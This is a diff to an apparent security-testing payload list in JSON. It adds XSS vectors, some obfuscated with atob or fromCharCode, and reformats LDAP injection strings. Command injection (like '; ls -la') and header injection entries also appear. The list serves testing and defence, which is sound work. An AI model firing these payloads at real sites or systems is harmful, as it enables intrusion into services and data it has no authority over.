@@ -37,7 +37,17 @@
       "<iframe src='javascript:alert(1)'>",
       "<marquee onstart=alert('XSS')>",
       "'\"><script>alert('XSS')</script>",
-      "<IMG SRC=\"javascript:alert('XSS');\">"
+      "<IMG SRC=\"javascript:alert('XSS');\">",
+      "<input onfocus=alert('XSS') autofocus>",
+      "<div onmouseover=alert('XSS')>hover me</div>",
+      "<details open ontoggle=alert('XSS')>",
+      "<svg/onload=alert('XSS')>",
+      "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+      "<a href=\"javascript:alert('XSS')\">click</a>",
+      "<form action=\"javascript:alert('XSS')\"><input type=submit>",
+      "<math><maction xlink:href=\"javascript:alert('XSS')\">click</maction></math>",
+      "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
+      "<img src=1 onerror=alert`XSS`>"
     ],
     "command_injection": [
       "; ls -la",
@@ -135,29 +145,28 @@
       ";Content-Length: 0",
       ",Content-Length: 0"
     ],
-   "ldap_injection": [
-     "*",
-     "*)(uid=*",
-     "*((uid=*",
-     "admin*",
-     "*)(objectClass=*",
-     "admin)(&(password=*",
-     "*((uid=admin",
-     "*)(&(objectClass=*",
-     "admin)(&(uid=*",
-     "*)(uid=admin)(|(uid=*))",
-
-     "*)()",
-     "*)(cn=*)",
-     "*)(|(cn=admin))",
-     "*)(&(cn=*)(sn=*))",
-     "*)(|(objectClass=person))",
-     "*)(&(uid=*)(cn=admin*))",
-     "*)(|(uid=*)(!(uid=*)))",
-     "*)(&(mail=*)(uid=*))",
-     "*)(|(samAccountName=*))",
-     "*)(&(objectCategory=person)(cn=*))"
-  ]
+    "ldap_injection": [
+      "*",
+      "*)(uid=*",
+      "*((uid=*",
+      "admin*",
+      "*)(objectClass=*",
+      "admin)(&(password=*",
+      "*((uid=admin",
+      "*)(&(objectClass=*",
+      "admin)(&(uid=*",
+      "*)(uid=admin)(|(uid=*))",
+      "*)()",
+      "*)(cn=*)",
+      "*)(|(cn=admin))",
+      "*)(&(cn=*)(sn=*))",
+      "*)(|(objectClass=person))",
+      "*)(&(uid=*)(cn=admin*))",
+      "*)(|(uid=*)(!(uid=*)))",
+      "*)(&(mail=*)(uid=*))",
+      "*)(|(samAccountName=*))",
+      "*)(&(objectCategory=person)(cn=*))"
+    ]
   },
   "notes": [
     "Use these strings for security testing only",
